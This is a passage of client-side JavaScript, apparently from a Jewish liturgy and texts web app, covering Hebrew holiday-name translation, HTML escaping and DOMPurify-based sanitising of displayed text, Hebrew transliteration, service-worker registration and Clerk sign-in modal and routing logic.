                .replace(/Tish[’']?a\s+B[’']Av|Tisha\s+B[’']?Av/gi, 'תשעה באב')
                .replace(/Tu\s+BiShvat/gi, 'ט״ו בשבט')
                .replace(/Tu\s+B[’']Av/gi, 'ט״ו באב')
                .replace(/Ta[’']anit\s+Bechorot/gi, 'תענית בכורות')
                .replace(/Ta[’']anit\s+Esther/gi, 'תענית אסתר')
                .replace(/Asara\s+B[’']Tevet/gi, 'עשרה בטבת')
                .replace(/Tzom\s+Gedaliah/gi, 'צום גדליה')
                .replace(/Tzom\s+Tam+uz/gi, 'צום תמוז')
                .replace(/Yom\s+HaAtzma[’']?ut/gi, 'יום העצמאות')
                .replace(/Yom\s+HaZikaron/gi, 'יום הזיכרון')
                .replace(/Yom\s+HaShoah/gi, 'יום השואה')
                .replace(/Yom\s+HaAliyah/gi, 'יום העלייה')
                .replace(/Yom\s+Yerushalayim/gi, 'יום ירושלים')
                .replace(/LaBehemot/gi, 'לבהמות')
                .replace(/Lag\s+BaOmer/gi, 'ל״ג בעומר')
                .replace(/\bKatan\b/gi, 'קטן')
                .replace(/Hoshana\s+Raba/gi, 'הושענא רבה')
                .replace(/Leil\s+Selichot/gi, 'ליל סליחות')
                .replace(/Chag\s+HaBanot/gi, 'חג הבנות')
                .replace(/\bSigd\b/gi, 'סיגד')
                .replace(/\bErev\s+/gi, 'ערב ')
                .replace(/Shabbat/gi, 'שבת');

            Object.entries(HOLIDAY_MONTH_HE_MAP).forEach(([en, he]) => {
                result = result.replace(new RegExp(String.raw`\b${en}\b`, 'g'), he);
            });

            // Hebcal's day numbering and counts ("Sukkot III (CH''M)",
            // "Chanukah: 3 Candles", "Rosh Hashana 5787"): left in Latin, an
            // RTL line also moved them to the wrong end ("II ראש השנה").
            const ROMAN = { I: 1, II: 2, III: 3, IV: 4, V: 5, VI: 6, VII: 7, VIII: 8 };
            result = result
                .replace(/\(CH[’'"]{1,2}M\)/gi, '(חוה״מ)')
                .replace(/:\s*(\d+)\s+Candles?\b/gi, (_m, n) => (Number(n) === 1 ? ': נר ראשון' : `: ${hebrewNumber(n)} נרות`))
                .replace(/:\s*(\d+)(?:st|nd|rd|th)\s+Day\b/gi, (_m, n) => `: יום ${hebrewNumber(n)}`)
                .replace(/([\u0590-\u05FF]\s)(VIII|VII|VI|IV|V|III|II|I)\b/g, (_m, lead, numeral) => `${lead}${hebrewNumber(ROMAN[numeral])}`)
                .replace(/\b(5\d{3})\b/g, (_m, year) => hebrewNumber(year));

            return result;
        }

        function translateHolidayName(name) {
            const raw = String(name || '').trim();
            if (!raw || !isHebrewMode()) return raw;
            return holidayNameToHebrew(raw);
        }

        function formatOmerLabel(meta) {
            if (!meta?.omer_day) return '--';
            if (!isHebrewMode()) return meta.omer_label || `Day ${meta.omer_day} of 49`;
            return `יום ${meta.omer_day} לעומר`;
        }

        function formatWeeklyShabbatLabel(meta) {
            const raw = String(meta?.weekly_shabbat_parasha || '').trim();
            if (!raw) return '--';
            if (!isHebrewMode()) return `Shabbat ${raw}`;
            const parts = raw.split(/[-–]/).map((part) => part.trim()).filter(Boolean);
            const he = parts.length
                ? parts.map((part) => PARASHA_HE_MAP[part] || part).join('-')
                : (PARASHA_HE_MAP[raw] || raw);
            return `שבת ${he}`;
        }

        function translateShabbatWarning(message) {
            const raw = String(message || '').trim();
            if (!raw || !isHebrewMode()) return raw;
            if (raw.includes('Shabbat is approaching')) {
                return 'השבת מתקרבת. נותרו פחות מ-18 דקות לשקיעה.';
            }
            return raw;
        }

        function escapeHtml(text) {
            return (text || '')
                .replaceAll('&', '&amp;')
                .replaceAll('<', '&lt;')
                .replaceAll('>', '&gt;')
                .replaceAll('"', '&quot;')
                .replaceAll("'", '&#039;');
        }

        // static/js/zmanim.js's installZmanim()/refreshZmanimDisplay()/
        // fetchZmanimAPI() take these seven functions
        // as an explicit deps object instead of reaching for window.* inside
        // the module -- this is the one place that builds it for the two
        // call sites that still live in this inline script (toggleLanguage's
        // re-render on language switch, searchByCity's new-location fetch).
        function buildZmanimDeps() {
            return {
                t,
                isHebrewMode,
                translateHolidayName,
                formatOmerLabel,
                formatWeeklyShabbatLabel,
                translateShabbatWarning,
                escapeHtml,
            };
        }

        // Security audit P3: escapeHtml() blocks attribute breakout (quotes/
        // angle brackets) but not a javascript:/data: URI scheme -- neither
        // contains an HTML-special character, so they pass through
        // untouched and would render as a live, clickable, script-executing
        // href. Allowlists http(s) before a value is ever used as an href.
        function safeHref(url) {
            const value = String(url || '').trim();
            return /^https?:\/\//i.test(value) ? escapeHtml(value) : '#';
        }

        function decodeHtmlEntities(text) {
            const parser = document.createElement('textarea');
            parser.innerHTML = String(text || '');
            return parser.value;
        }

        function normalizeDisplayText(text = '') {
            const withoutFootnotes = String(text)
                // Remove superscript markers and adjacent footnote blocks to avoid noisy inline translation artifacts.
                .replace(/<sup[^>]*>[\s\S]*?<\/sup>\s*<(?:i|span|small)[^>]*>[\s\S]*?<\/(?:i|span|small)>/gi, ' ')
                .replace(/<(?:i|span|small)[^>]*class=["'][^"']*footnote[^"']*["'][^>]*>[\s\S]*?<\/(?:i|span|small)>/gi, ' ')
                .replace(/<sup[^>]*>[\s\S]*?<\/sup>/gi, ' ');

            const withoutTags = withoutFootnotes
                .replace(/<br\s*\/?>/gi, '\n')
                .replace(/<[^<>]*>/g, ' ');

            return decodeHtmlEntities(withoutTags)
                .replaceAll('\u00a0', ' ')
                .replace(/&nbsp;/gi, ' ')
                .replace(/&thinsp;/gi, ' ')
                .replace(/[ \t]+/g, ' ')
                .replace(/\s+/g, newlineIfAny)
                .replace(/\n{3,}/g, '\n\n')
                .trim();
        }

        // Same cleanup as normalizeDisplayText() (footnote stripping, <br> to
        // newline, entity decoding, whitespace collapsing) but keeps Sefaria's
        // <b>/<strong>/<i>/<em> emphasis markup as literal substrings instead
        // of stripping every tag. Used by callers that store "normalized but
        // unescaped" text for reuse across multiple render passes -- e.g.
        // displayPrayer's paragraphPairs -- so escapeDisplayTextPreservingEmphasis()
        // can render that emphasis later instead of it already being gone.
        function normalizeDisplayTextPreservingEmphasis(text = '') {
            const withoutFootnotes = String(text)
                .replace(/<sup[^>]*>[\s\S]*?<\/sup>\s*<(?:i|span|small)[^>]*>[\s\S]*?<\/(?:i|span|small)>/gi, ' ')
                .replace(/<(?:i|span|small)[^>]*class=["'][^"']*footnote[^"']*["'][^>]*>[\s\S]*?<\/(?:i|span|small)>/gi, ' ')
                .replace(/<sup[^>]*>[\s\S]*?<\/sup>/gi, ' ');

            const withoutTags = withoutFootnotes
                .replace(/<br\s*\/?>/gi, '\n')
                // "small" preserved alongside b/strong/i/em: Sefaria wraps
                // siddur rubrics/instructions in <b><small>...</small></b>,
                // and stripping the <small> here (before it ever reaches
                // escapeDisplayTextPreservingEmphasis's DOMPurify pass)
                // made rubric text visually identical to ordinary bolded
                // prayer text -- no non-color way to style it distinctly.
                .replace(/<(?!\/?(?:b|strong|i|em|small)(?:[\s>]|$))[^<>]*>/gi, ' ');

            return decodeHtmlEntities(withoutTags)
                .replaceAll('\u00A0', ' ')
                .replace(/&nbsp;/gi, ' ')
                .replace(/&thinsp;/gi, ' ')
                .replace(/[ \t]+/g, ' ')
                .replace(/\s+/g, newlineIfAny)
                .replace(/\n{3,}/g, '\n\n')
                .trim();
        }

        // Sefaria liturgy text (e.g. rubric/instruction emphasis in the
        // siddur, or a commentary's bolded/italicized lead words) legitimately
        // wraps text in <b>/<strong>/<i>/<em> in both the he and en fields --
        // normalizeDisplayText()'s catch-all tag strip is correct for its
        // plain-text call sites (bookmarks, aria-labels, transliteration
        // input) but loses that real formatting for HTML display. This
        // variant runs the same footnote-stripping, then hands off to
        // DOMPurify with a four-tag allowlist rather than hand-rolling tag
        // preservation with regex: DOMPurify parses a real DOM (so an
        // attribute-bearing or unbalanced tag -- e.g. a stray "<b onclick=...>"
        // -- can't leave a dangling closing tag or slip through unescaped the
        // way a regex placeholder swap could) and its output is already safe
        // to insert via innerHTML, matching how renderAnswerMarkdown() already
        // uses DOMPurify for the AI-answer pipeline.
        const DISPLAY_SAFE_TAGS = ['b', 'strong', 'i', 'em', 'small'];

        function escapeDisplayTextPreservingEmphasis(text = '') {
            const withoutFootnotes = String(text || '')
                .replace(/<sup[^>]*>[\s\S]*?<\/sup>\s*<(?:i|span|small)[^>]*>[\s\S]*?<\/(?:i|span|small)>/gi, ' ')
                .replace(/<(?:i|span|small)[^>]*class=["'][^"']*footnote[^"']*["'][^>]*>[\s\S]*?<\/(?:i|span|small)>/gi, ' ')
                .replace(/<sup[^>]*>[\s\S]*?<\/sup>/gi, ' ');

            const withBreaksAsNewlines = withoutFootnotes.replace(/<br\s*\/?>/gi, '\n');

            const sanitized = (window.DOMPurify && typeof window.DOMPurify.sanitize === 'function')
                ? DOMPurify.sanitize(withBreaksAsNewlines, { ALLOWED_TAGS: DISPLAY_SAFE_TAGS, ALLOWED_ATTR: [] })
                : escapeHtml(withBreaksAsNewlines.replace(/<[^<>]*>/g, ' '));

            return sanitized
                .replaceAll('\u00A0', ' ')
                .replace(/&nbsp;/gi, ' ')
                .replace(/&thinsp;/gi, ' ')
                .replace(/[ \t]+/g, ' ')
                .replace(/\s+/g, newlineIfAny)
                .replace(/\n{3,}/g, '\n\n')
                .trim();
        }

        const INPUT_HIDDEN_UNICODE_RE = /[\u0000-\u001F\u007F-\u009F\u200B-\u200F\u202A-\u202E\u2060-\u206F\uFEFF]/g;
        const INPUT_SYSTEM_META_RE = /[`$<>\\|{}]/g;

        function sanitizeQuestionInput(rawValue) {
            return String(rawValue || '')
                .replace(INPUT_HIDDEN_UNICODE_RE, '')
                .replace(INPUT_SYSTEM_META_RE, ' ')
                .replace(/\s+/g, ' ')
                .trim()
                .slice(0, 1200);
        }

        function debounce(fn, delay = 180) {
            let timer = null;
            return (...args) => {
                if (timer) clearTimeout(timer);
                timer = setTimeout(() => fn(...args), delay);
            };
        }

        // Markup this script builds is not in the server-rendered page the inlined
        // critical CSS was extracted from, so it waits for the full stylesheet
        // (window.ShelahStyles, set in index.html's head) instead of showing
        // unstyled for the moment the bundle is still on its way.
        function afterStyles(fn) {
            const styles = window.ShelahStyles;
            if (!styles || styles.done) return fn();
            return styles.ready.then(fn);
        }

        function queueBackgroundTask(task, timeout = 1200) {
            if (typeof task !== 'function') return;
            const run = () => {
                try {
                    void afterStyles(task);
                } catch {
                    // Keep background scheduling resilient.
                }
            };
            if ('requestIdleCallback' in window) {
                window.requestIdleCallback(run, { timeout });
                return;
            }

            setTimeout(run, 0);
        }

        const debouncedPushPrefsToServer = debounce(() => {
            void pushPrefsToServer();
        }, 700);

        function normalizeMetadataFilters(raw = {}) {
            return {
                era: String(raw.era || '').trim(),
                author: String(raw.author || '').trim(),
                category: String(raw.category || '').trim(),
                geography: String(raw.geography || '').trim(),
                nusach: String(raw.nusach || '').trim(),
            };
        }

        function appendMetadataFilters(params) {
            const metadata = normalizeMetadataFilters(appState.prefs.metadataFilters || {});
            Object.entries(metadata).forEach(([key, value]) => {
                if (value) {
                    params.set(key, value);
                }
            });
            return params;
        }

        const HEBREW_CANTILLATION_RE = /[\u0591-\u05AF]/g;
        const HEBREW_VOWELS_RE = /[\u05B0-\u05BC\u05C1\u05C2\u05C7]/g;
        const HEBREW_CLUSTER_RE = /[\u05D0-\u05EA][\u0591-\u05C7]*/g;

        const HEBREW_BASE_CONSONANT_MAP = {
            'א': '', 'ב': 'v', 'ג': 'g', 'ד': 'd', 'ה': 'h',
            'ו': 'v', 'ז': 'z', 'ח': 'ch', 'ט': 't', 'י': 'y',
            'כ': 'kh', 'ך': 'kh', 'ל': 'l', 'מ': 'm', 'ם': 'm',
            'נ': 'n', 'ן': 'n', 'ס': 's', 'ע': '', 'פ': 'f',
            'ף': 'f', 'צ': 'tz', 'ץ': 'tz', 'ק': 'k', 'ר': 'r',
            'ש': 'sh', 'ת': 't',
        };

        const HEBREW_VOWEL_LATIN_MAP = {
            '\u05B0': 'e', // sheva
            '\u05B1': 'e', // hataf segol
            '\u05B2': 'a', // hataf patah
            '\u05B3': 'o', // hataf qamatz
            '\u05B4': 'i', // hiriq
            '\u05B5': 'e', // tzere
            '\u05B6': 'e', // segol
            '\u05B7': 'a', // patah
            '\u05B8': 'a', // qamatz
            '\u05B9': 'o', // holam
            '\u05BB': 'u', // qubuts
            '\u05C7': 'a', // qamatz qatan fallback
        };

        function applyHebrewDisplaySettings(text = '') {
            let value = String(text || '');
            if (!appState.prefs.showCantillation) {
                value = value.replace(HEBREW_CANTILLATION_RE, '');
            }
            if (!appState.prefs.showVowels) {
                value = value.replace(HEBREW_VOWELS_RE, '');
            }
            return value;
        }

        function getTranslitConsonant(letter, marks) {
            const hasDagesh = marks.includes('\u05BC');

            if (letter === 'ב') return hasDagesh ? 'b' : 'v';
            if (letter === 'כ' || letter === 'ך') return hasDagesh ? 'k' : 'kh';
            if (letter === 'פ' || letter === 'ף') return hasDagesh ? 'p' : 'f';
            if (letter === 'ש') return marks.includes('\u05C2') ? 's' : 'sh';
            if (letter === 'ו') {
                if (hasDagesh || marks.includes('\u05B9') || marks.includes('\u05BB')) {
                    return '';
                }
                return 'v';
            }

            return HEBREW_BASE_CONSONANT_MAP[letter] || '';
        }

        function getTranslitVowel(marks) {
            for (const mark of marks) {
                if (HEBREW_VOWEL_LATIN_MAP[mark]) {
                    return HEBREW_VOWEL_LATIN_MAP[mark];
                }
            }
            return '';
        }

        function transliterateHebrewText(text = '') {
            const source = String(text || '').replace(HEBREW_CANTILLATION_RE, '');
            const transliterated = source.replace(HEBREW_CLUSTER_RE, (cluster) => {
                const letter = cluster.charAt(0);
                const marks = cluster.slice(1);
                const consonant = getTranslitConsonant(letter, marks);
                const vowel = getTranslitVowel(marks);

                if (!consonant && !vowel) return '';
                if (!consonant) return vowel;
                return `${consonant}${vowel}`;
            });

            return transliterated
                .replaceAll('׳', "'")
                .replaceAll('״', '"')
                .replace(/\s+/g, ' ')
                .trim();
        }

        function transliterationMarkup(rawHebrew) {
            if (!appState.prefs.transliteration) return '';
            const plain = normalizeDisplayText(rawHebrew || '');
            if (!plain) return '';
            if (!/[\u05D0-\u05EA]/.test(plain)) return '';
            const transliterated = escapeHtml(transliterateHebrewText(plain));
            return `<p class="segment-translit mt-2 text-sm text-slate-500 italic">${transliterated}</p>`;
        }

        function appendDevtoolsLog(entry) {
            if (!devtoolsLog) return;
            const timestamp = new Date().toLocaleTimeString();
            devtoolsLog.textContent = `[${timestamp}] ${entry}\n${devtoolsLog.textContent}`.slice(0, 9000);
        }

        function logReliability(eventName, details = null) {
            const payload = details ? `${eventName} ${JSON.stringify(details)}` : eventName;
            console.info('[Reliability]', payload);
            appendDevtoolsLog(payload);
        }

        async function registerServiceWorker() {
            if (!('serviceWorker' in navigator)) return;
            try {
                const migrationKey = 'shelah-sw-v3-migrated';
                if (localStorage.getItem(migrationKey) !== 'true') {
                    try {
                        const registrations = await navigator.serviceWorker.getRegistrations();
                        await Promise.all(registrations.map((registration) => registration.unregister()));

                        if ('caches' in window) {
                            const cacheKeys = await caches.keys();
                            await Promise.all(
                                cacheKeys
                                    .filter((key) => key.startsWith('shelah-cache-'))
                                    .map((key) => caches.delete(key))
                            );
                        }
                    } catch {
                        // Continue with registration even if migration cleanup fails.
                    }

                    localStorage.setItem(migrationKey, 'true');
                }

                await navigator.serviceWorker.register('/service-worker.js?swv=3', { updateViaCache: 'none' });
                logReliability('service-worker-registered');
            } catch (error) {
                logReliability('service-worker-register-failed', { message: error.message });
            }
        }

        function isClerkConfigured() {
            return Boolean(window.APP_CLERK?.publishableKey);
        }

        // Clerk's SDK (~85 KB, plus two requests of its own) comes from
        // window.ShelahLibs (index.html's head). It starts early for a visit
        // that may be signed in -- Clerk's own cookie says a session exists
        // (html.auth-likely-in), or the link names something that needs an
        // identity -- and otherwise only when someone signs in, signs up or
        // opens the account modal: with no Clerk cookie nobody is signed in,
        // so there is nothing for it to report before then. clerkStart is that
        // one start (a promise of whether Clerk is up); clerkLoaded settles
        // once Clerk.load() has (true) or never will (false).
        let clerkStart = null;
        let clerkFailed = false;
        let settleClerkLoaded = () => {};
        const clerkLoaded = new Promise((resolve) => { settleClerkLoaded = resolve; });

        function clerkNeededAtLoad() {
            if (document.documentElement.classList.contains('auth-likely-in')) return true;
            const route = window.ShelahRouter?.readRoute() || {};
            return Boolean(route.auth || route.chat || route.history || route.conversation || route.a);
        }

        // Neither the SDK script nor Clerk.load() has a timeout of its own. If
        // they stall, the auth slot stops waiting after this long and shows
        // Sign In instead of staying blank; a late load still corrects it.
        let clerkStallMs = 8000;

        function showSignInWhileClerkStalls() {
            if (!authControls?.hasAttribute('aria-busy')) return;
            signInBtn?.classList.remove('hidden');
            userProfileMenuContainer?.classList.add('hidden');
            settleAuthSlot();
        }

        function ensureClerk() {
            if (!isClerkConfigured()) return Promise.resolve(false);
            if (!clerkStart) {
                clerkStart = (async () => {
                    const stall = setTimeout(showSignInWhileClerkStalls, clerkStallMs);
                    try {
                        if (!window.Clerk && window.ShelahLibs) await window.ShelahLibs.load('clerk');
                        await initClerkAuth();
                    } finally {
                        clearTimeout(stall);
                    }
                    clerkFailed = !window.Clerk?.loaded;
                    if (clerkFailed) clerkStart = null; // the next sign-in click tries again
                    return !clerkFailed;
                })();
            }
            return clerkStart;
        }

        // The account modal the URL names (router.js `auth`: /signin,
        // /profile, /settings, or the same word after a view).
        function currentAuthPage() {
            return window.ShelahRouter?.readRoute().auth || '';
        }

        // The auth slot's content fades in once its state is known (it was
        // held invisible at its likely size, style.css #authControls). `hide`:
        // sign-in turned out to be unavailable.
        function settleAuthSlot({ hide = false } = {}) {
            if (!authControls) return;
            if (hide) {
                authControls.classList.add('hidden');
                authControls.classList.remove('flex');
            }
            authControls.removeAttribute('aria-busy');
        }

        async function showSignedInAuthUi(displayName, userId) {
            authControls.style.display = 'flex';
            signInBtn?.classList.add('hidden');
            userProfileMenuContainer?.classList.remove('hidden');
            if (userProfileMenuLabel) {
                userProfileMenuLabel.textContent = displayName || 'Signed in';
            }
            settleAuthSlot();

            if (syncedPrefsUserId !== userId) {
                syncedPrefsUserId = userId;
                await loadPrefsFromServerIfSignedIn();
                void loadAskHistory();
                // The initial hydrateRoute() call can run before Clerk has
                // a session (main.js's module hydrate fires on
                // DOMContentLoaded, ahead of Clerk's own async init), so a
                // page loaded directly on an /answer/<id> link needs a retry here
                // once sign-in actually completes.
                const route = window.ShelahRouter?.readRoute();
                if (route?.chat) {
                    void hydrateChatId(route.chat);
                }
            }
        }

        function showSignedOutAuthUi(wasSignedIn) {
            signInBtn?.classList.remove('hidden');
            authControls.style.display = '';
            userProfileMenuContainer?.classList.add('hidden');
            settleAuthSlot();
            closeUserProfileMenu();
            syncedPrefsUserId = null;
            // A page loaded on an /answer/<id> link signed out: Clerk has
            // now settled with nobody, so the link is tried with the
            // device cookie alone (see hydrateChatId). Once per change of
            // who is signed in, not on every Clerk event.
            if (wasSignedIn !== false) {
                const chatRoute = window.ShelahRouter?.readRoute();
                if (chatRoute?.chat) void hydrateChatId(chatRoute.chat);
            }
            // Hide and clear history when signed out
            const histSec = document.getElementById('askHistorySection');
            if (histSec) histSec.classList.add('hidden');
            const histList = document.getElementById('askHistoryList');
            if (histList) histList.innerHTML = '';
        }

        async function refreshAuthUi() {
            if (!authControls) return;
            if (!isClerkConfigured()) {
                settleAuthSlot({ hide: true });
                return;
            }

            authControls.classList.remove('hidden');
            authControls.classList.add('flex');

            const user = window.Clerk?.user || null;
            const email = user?.primaryEmailAddress?.emailAddress || user?.emailAddresses?.[0]?.emailAddress || '';
            const displayName = user?.firstName || user?.username || email || '';
            const userId = user?.id || null;
            const wasSignedIn = lastAuthSignedIn;
            lastAuthSignedIn = Boolean(user);

            if (user) await showSignedInAuthUi(displayName, userId);
            else showSignedOutAuthUi(wasSignedIn);
            document.dispatchEvent(new CustomEvent('shelah:auth-changed', { detail: { signedIn: Boolean(user) } }));
        }

        // Clerk will never report anyone (it failed to load): an /answer/<id>
        // link that was waiting on it is tried with the device cookie alone.
        function settleSavedLinkWithoutClerk() {
            const route = window.ShelahRouter?.readRoute();
            if (route?.chat) void hydrateChatId(route.chat, { settled: true });
        }

        async function initClerkAuth() {
            if (!isClerkConfigured()) return;
            if (!window.Clerk) {
                console.warn('Clerk script did not load.');
                settleClerkLoaded(false);
                settleAuthSlot({ hide: true });
                settleSavedLinkWithoutClerk();
                return;
            }

            try {
                const publishableKey = String(window.APP_CLERK?.publishableKey || '').trim();
                if (!publishableKey) {
                    console.warn('Clerk publishable key is missing.');
                    settleClerkLoaded(false);
                    settleAuthSlot({ hide: true });
                    settleSavedLinkWithoutClerk();
                    return;
                }

                await window.Clerk.load({
                    publishableKey,
                    appearance: window.ShelahClerkAppearance?.(),
                    // Clerk 6 ships its sign-in UI as @clerk/ui (loaded before
                    // clerk-js by ShelahLibs); without it every modal throws.
                    ui: window.__internal_ClerkUICtor ? { ClerkUI: window.__internal_ClerkUICtor } : undefined,
                    // Where Clerk sends someone it cannot place from a redirect_url
                    // (the same fields as the Dashboard's "after sign-in/up fallback").
                    signInFallbackRedirectUrl: `${window.location.origin}/`,
                    signUpFallbackRedirectUrl: `${window.location.origin}/`,
                    // Without these Clerk finishes a sign-in with a full page load of
                    // the URL it was given, which raced the in-page close below and
                    // left the signed-in UI stale until a manual reload.
                    routerPush: (to) => clerkNavigate(to),
                    routerReplace: (to) => clerkNavigate(to, { replace: true }),
                });
                settleClerkLoaded(true);
                window.Clerk.addListener(async () => {
                    await refreshAuthUi();
                    await handleAuthRouteIntent();
                });
                await refreshAuthUi();
                await handleAuthRouteIntent();
            } catch (err) {
                console.error('Failed to initialize Clerk:', err);
                settleClerkLoaded(false);
                settleAuthSlot({ hide: true });
                settleSavedLinkWithoutClerk();
            }
        }

        async function authHeaders(baseHeaders = {}) {
            // Clerk is on its way (a signed-in visit): the request that asked
            // waits a moment for the session rather than going out as a guest.
            if (clerkStart && isClerkConfigured() && !window.Clerk?.loaded) {
                await Promise.race([clerkLoaded, new Promise((resolve) => setTimeout(resolve, 4000))]);
            }
            if (!isClerkConfigured() || !window.Clerk?.session) {
                return baseHeaders;
            }
            try {
                let token = await window.Clerk.session.getToken();
                if (!token) {
                    token = await window.Clerk.session.getToken({ skipCache: true });
                }
                if (!token) return baseHeaders;
                return {
                    ...baseHeaders,
                    Authorization: `Bearer ${token}`,
                };
            } catch {
                return baseHeaders;
            }
        }

        // Sign-in and the profile are URL overlays like the calendar: opening
        // one pushes `/signin` (or `/profile`) over the page, closing the
        // Clerk modal steps back off it, and Back/Forward close and reopen it
        // (syncAuthRoute). Clerk has no close event, so the modal's backdrop
        // leaving the DOM is the signal.
        const CLERK_MODAL_SELECTOR = '.cl-modalBackdrop';
        const CLERK_MODAL_WAIT_MS = 10000;
        const WINDOW_PAGES = new Set(['signin', 'signup']); // the pages that are a sign-in/up window itself
        let authModal = null; // { page, kind: 'signin' | 'signup' | 'profile', observer, timer }
        let authLeaving = false;

        // A legal page's Sign In (legal_scripts.html) goes to /signin with its
        // own path saved. Closing the modal on that /signin returns there
        // instead of to the home page. Only a /signin load reads it, and it
        // stays saved until used so an OAuth round trip back to /signin keeps it.
        const AUTH_RETURN_KEY = 'shelah:authReturn';
        const AUTH_RETURN_MAX_AGE_MS = 10 * 60 * 1000;
        let authReturnPath = (() => {
            try {
                const raw = sessionStorage.getItem(AUTH_RETURN_KEY);
                if (!raw) return null;
                if (trimTrailingSlashes(window.location.pathname) !== '/signin') {
                    sessionStorage.removeItem(AUTH_RETURN_KEY);
                    return null;
                }
                const saved = JSON.parse(raw);
                const fresh = Date.now() - Number(saved?.at) < AUTH_RETURN_MAX_AGE_MS;
                return fresh && /^\/[a-z][a-z-]*$/.test(saved?.path || '') ? saved.path : null;
            } catch {
                return null;
            }
        })();

        // The page as it is under the account overlay: where Clerk sends the user
        // once signed in (never the /signin URL itself, which is only a window).
        function authRedirectUrl() {
            if (authReturnPath) return `${window.location.origin}${authReturnPath}`;
            const router = window.ShelahRouter;
            if (!router) return `${window.location.origin}/`;
            const route = { ...router.readRoute() };
            delete route.auth;
            return `${window.location.origin}${router.routeUrl(route, window.location.pathname)}`;
        }

        // Clerk's own navigation (after sign-in, sign-up or sign-out) stays in the
        // page: the app's router when it owns the path, a normal load otherwise.
        function isModifiedClick(event) {
            return event.button !== 0 || event.metaKey || event.ctrlKey || event.shiftKey || event.altKey;
        }

        function clerkNavigate(to, { replace = false } = {}) {
            const target = new URL(to, window.location.origin);
            if (target.origin === window.location.origin) {
                const path = `${target.pathname}${target.search}`;
                const under = new URL(authRedirectUrl());
                // Already the page under the overlay: step back to it rather than
                // stacking a duplicate entry on top of the /signin one.
                if (currentAuthPage() && path === `${under.pathname}${under.search}`) {
                    leaveAuthRoute();
                    return;
                }
                if (window.ShelahRouter?.pushPath(`${path}${target.hash}`, { replace })) return;
            }
            if (replace) window.location.replace(target.href);
            else window.location.assign(target.href);
        }

        function stopWatchingAuthModal() {
            if (!authModal) return;
            authModal.observer.disconnect();
            clearTimeout(authModal.timer);
            authModal = null;
        }

        const AUTH_DIALOG_NAMES = {
            signin: ['Sign in', 'התחברות'],
            signup: ['Sign up', 'הרשמה'],
            profile: ['Account', 'חשבון'],
        };

        // Clerk's modal is a role="dialog" with no name, so a screen reader
        // announced only "dialog" (axe aria-dialog-name). It is named by its
        // own visible title, so the name follows a switch to sign-up or a
        // language change; until a title renders, by what was opened.
        function nameAuthDialog(kind) {
            const dialog = document.querySelector('.cl-modalContent[role="dialog"]');
            if (!dialog) return;
            const title = dialog.querySelector('.cl-headerTitle');
            if (title) {
                title.id ||= 'clerkDialogTitle';
                dialog.removeAttribute('aria-label');
                if (dialog.getAttribute('aria-labelledby') !== title.id) dialog.setAttribute('aria-labelledby', title.id);
                return;
            }
            const [en, he] = AUTH_DIALOG_NAMES[kind] || AUTH_DIALOG_NAMES.signin;
            const name = isHebrewMode() ? he : en;
            if (dialog.getAttribute('aria-label') !== name) dialog.setAttribute('aria-label', name);
        }

        function watchAuthModal(page, kind) {
            stopWatchingAuthModal();
            let seen = Boolean(document.querySelector(CLERK_MODAL_SELECTOR));
            const observer = new MutationObserver(() => {
                if (document.querySelector(CLERK_MODAL_SELECTOR)) {
                    seen = true;
                    nameAuthDialog(kind);
                    clearTimeout(watch.timer);
                } else if (seen) {
                    onAuthModalClosed(watch);
                }
            });
            const watch = { page, kind, observer, timer: 0 };
            // A modal that never renders (Clerk failed to load a component)
            // stops being watched; the URL is left as it is.
            watch.timer = setTimeout(() => { if (!seen && authModal === watch) stopWatchingAuthModal(); }, CLERK_MODAL_WAIT_MS);
            observer.observe(document.body, { childList: true, subtree: true });
            authModal = watch;
        }

        function onAuthModalClosed(watch) {
            if (authModal !== watch) return;
            stopWatchingAuthModal();
            // /profile asked for a sign-in first: once signed in, the profile
            // it named opens in its place.
            if (watch.kind !== 'profile' && !WINDOW_PAGES.has(watch.page) && window.Clerk?.user && currentAuthPage() === watch.page) {
                void showAuthModal(watch.page);
                return;
            }
            leaveAuthRoute();
        }

        // Takes `auth` off the URL once: Back off the entry the app pushed,
        // or in place on a cold-loaded /signin. `authLeaving` holds until that
        // Back's popstate lands, so a second caller can't step back twice.
        function leaveAuthRoute() {
            if (authLeaving || !currentAuthPage()) return;
            stopWatchingAuthModal();
            if (authReturnPath) {
                const path = authReturnPath;
                authReturnPath = null;
                try { sessionStorage.removeItem(AUTH_RETURN_KEY); } catch { /* storage blocked */ }
                authLeaving = true;
                window.location.replace(path);
                return;
            }
            const how = window.ShelahRouter?.closeOverlay('auth', { auth: null });
            if (how === 'back') {
                authLeaving = true;
                window.addEventListener('popstate', () => { authLeaving = false; }, { once: true });
            }
        }

        function closeAuthModal() {
            const kind = authModal?.kind;
            stopWatchingAuthModal();
            try {
                if (kind === 'signin') window.Clerk?.closeSignIn?.();
                else if (kind === 'signup') window.Clerk?.closeSignUp?.();
                else if (kind === 'profile') window.Clerk?.closeUserProfile?.();
            } catch {
                // Clerk already closed it.
            }
        }

        // Opens the modal `page` names. Idempotent: Clerk's listener and
        // hydrateRoute both call it, and an open modal stays as it is.
        async function showAuthModal(page) {
            if (!window.Clerk) return;
            const signedOutKind = page === 'signup' ? 'signup' : 'signin';
            const kind = WINDOW_PAGES.has(page) || !window.Clerk.user ? signedOutKind : 'profile';
            if (authModal?.page === page && authModal.kind === kind) return;
            if (WINDOW_PAGES.has(page) && window.Clerk.user) {
                // Already signed in (a sign-in just finished, or a stale
                // /signin link): there is nothing to show.
                closeAuthModal();
                leaveAuthRoute();
                return;
            }
            closeUserProfileMenu();
            if (authModal) closeAuthModal();
            // Watched before Clerk is awaited, so a second caller in the
            // meantime sees this modal as open instead of opening another.
            watchAuthModal(page, kind);
            try {
                if (kind === 'signin' || kind === 'signup') {
                    // Back to the page under the overlay after a sign-in, in place
                    // or through a redirect (OAuth). A /profile that asked for a
                    // sign-in first keeps its own URL so it opens afterwards.
                    const returnTo = WINDOW_PAGES.has(page) ? authRedirectUrl() : window.location.href;
                    const open = kind === 'signup' ? window.Clerk.openSignUp : window.Clerk.openSignIn;
                    await open.call(window.Clerk, {
                        fallbackRedirectUrl: returnTo,
                        appearance: window.ShelahClerkAppearance?.(),
                    });
                } else {
                    await window.Clerk.openUserProfile({ appearance: window.ShelahClerkAppearance?.() });
                }
            } catch (error) {
                console.warn(`Unable to open the Clerk ${kind} modal:`, error);
                leaveAuthRoute();
            }
        }

        async function openAuthRoute(page) {
            if (!(await ensureClerk())) return;
            const router = window.ShelahRouter;
            if (router && currentAuthPage() !== page) {
                router.pushRoute({ auth: page }, { overlay: 'auth' });
            }
            await showAuthModal(page);
        }

